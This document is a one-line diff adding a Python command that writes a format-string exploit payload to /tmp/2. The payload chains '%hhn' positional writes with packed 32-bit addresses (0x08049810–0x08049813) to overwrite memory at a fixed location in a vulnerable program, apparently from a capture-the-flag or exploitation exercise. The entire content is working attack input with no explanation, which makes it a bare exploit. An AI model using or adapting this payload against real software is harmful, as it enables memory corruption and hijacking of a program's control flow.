@@ -1,0 +1,1 @@
+python -c 'import struct; import sys; sys.stdout.write("a" + "%41$hhn" + "b" + "%42$hhn" + "c"*0x42 + "%44$hhn" + "d"*0x11 + "%43$hhn" + "ZZZ" + struct.pack("<I", 0x08049813) + struct.pack("<I", 0x08049812) + struct.pack("<I", 0x08049811) + struct.pack("<I", 0x08049810));' > /tmp/2
